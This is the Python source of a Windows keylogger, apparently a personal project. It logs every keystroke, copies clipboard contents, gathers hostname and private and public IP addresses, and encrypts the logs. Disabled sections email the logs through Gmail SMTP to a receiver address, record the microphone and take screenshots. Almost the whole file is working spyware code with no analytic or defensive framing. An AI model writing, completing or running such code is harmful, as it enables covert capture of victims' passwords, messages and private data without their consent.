# Libraries

# email
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib
# sysinfo
import socket
import platform
# clipboard
import win32clipboard
# keystroke
from pynput.keyboard import Key, Listener
# additional info
import time
import os
# mic
from scipy.io.wavfile import write
import sounddevice as sd
# encryption
from cryptography.fernet import Fernet
# additional info
import getpass
from requests import get
# screenshot
from multiprocessing import Process, freeze_support
from PIL import ImageGrab

keys_info = "key_log.txt"
sys_info="sys_info.txt"
clipboard_info="clipboard.txt"
audio_info="audio.wav"
screenshot_info="screenshot.png"

keys_info_en="key_log_en.txt"
sys_info_en="sys_info_en.txt"
clipboard_info_en="clipboard_en.txt"

email_address="sender address"
password="of above email"
toaddr="receiver address"
mic_time=10
key="add generatedkey"

file_path = "D:\\PycharmProjects\\Keylogger"
extend = "\\"
file_merge = file_path + extend
# function to send email
""" 
def send_email(filename,attachment,toaddr):
    fromaddr=email_address
    msg=MIMEMultipart()
    msg["From"]=fromaddr
    msg["To"]=toaddr
    msg["Subject"]="Log file"
    body = "Body of the mail"
    msg.attach(MIMEText(body,'plain'))
    filename=filename
    attachment=open(attachment, 'rb')
    p = MIMEBase('application','octet-stream')
    p.set_payload((attachment).read())
    encoders.encode_base64(p)
    p.add_header('Content-Disposition',"attachment; filename = %s"% filename)
    msg.attach(p)
    s=smtplib.SMTP('smtp.gmail.com',587)
    s.starttls()
    s.login(fromaddr,password)
    text = msg.as_string()
    s.sendmail(fromaddr,toaddr,text)
    s.quit()

send_email(keys_info,file_path + extend + keys_info,toaddr)
 """
# function to get system information
def computer_info():
    with open(file_path + extend + sys_info,"a") as file:
        hostname = socket.gethostname()
        IPaddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            file.write("Public IP address: "+ public_ip+"\n")
        except Exception:
            file.write("Couldn't get public IP address (most likely max query) \n")
        file.write("Processor: " + (platform.processor())+"\n")
        file.write("System: "+platform.system()+" "+platform.version()+"\n")
        file.write("Machine: "+platform.machine()+"\n")
        file.write("Host Name: "+hostname+"\n")
        file.write("Private IP Address: "+IPaddr+"\n")
    file.close()

computer_info()

# function to get clipboard
def copy_clipboard():
    with open(file_path + extend + clipboard_info,"a")as file:
        try:
            win32clipboard.OpenClipboard()
            pasted_data=win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            file.write("Clipboard data: \n"+pasted_data)
        except:
            file.write("Clipboard could not be copied.")
    file.close()

copy_clipboard()

# function to get microphone recording
"""
def mic():
    fs=44100
    seconds=mic_time
    recording=sd.rec(int(seconds*fs),samplerate=fs,channels=2)
    sd.wait()

    write(file_path+extend+audio_info,fs,recording)

mic()
"""

# function to get screenshot
"""
def screenshot():
    img=ImageGrab.grab()
    img.save(file_path+extend+screenshot_info)

screenshot()
"""

# main program
count=0
keys=[]

def on_press(key):
    global keys, count
    print(key)
    keys.append(key)
    count += 1

    if count>=1:
        count=0
        write_file(keys)
        keys = []


def write_file(keys):
    with open(file_path + extend + keys_info, "a") as file :
        for key in keys:
            k= str(key).replace("'","")
            if k.find("space") > 0 :
                file.write("\n")
                file.close()
            elif k.find("Key") == -1:
                file.write(k)
                file.close()

def on_release(key):
    if key == Key.esc:
        return False

with Listener (on_press=on_press, on_release=on_release) as listener:
    listener.join()

#encrypting files
files_to_encrypt = [file_merge + keys_info,file_merge + sys_info,file_merge + clipboard_info]
encrypted_files = [file_merge + keys_info_en,file_merge + sys_info_en, file_merge + clipboard_info_en]

i = 0

for encryptin_files in files_to_encrypt:
    with open(files_to_encrypt[i],'rb')as f:
        data=f.read()

    fernet=Fernet(key)
    encrypted=fernet.encrypt(data)

    with open(encrypted_files[i],'wb')as f:
        f.write(encrypted)
    i += 1
# end of program
